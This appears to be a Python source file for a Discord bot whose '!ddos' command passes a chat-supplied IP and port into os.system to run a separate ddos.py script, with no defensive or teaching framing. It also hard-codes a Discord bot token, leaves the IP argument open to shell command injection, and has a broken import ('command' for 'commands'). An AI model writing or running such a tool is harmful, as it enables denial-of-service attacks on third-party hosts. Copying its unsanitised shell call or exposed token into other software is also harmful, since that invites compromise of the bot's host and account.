import discord
import os, sys
from discord.ext import command

intents = discord.Intents().all()
bot = discord.Client(intents=intents)
bot = commands.Bot(command_prefix="!",intents=intents)


@bot.command()
async def ddos(ctx, ip: str = None, port: int = None):
  if ip is None:
    await ctx.send("Input ip")
  elif port is None:
    await ctx.send("Input port")
  else:
    await ctx.send("Attac ip and port")
    os.system(f"python ddos.py {ip} {port}")
 


bot.run("MTA4MDk4NDQxMjQwMzAyMzkyMg.GJ7i6v.IRXR8y0tvFwPqQmpine0QmBjc5Q57sZz9Qh4sg")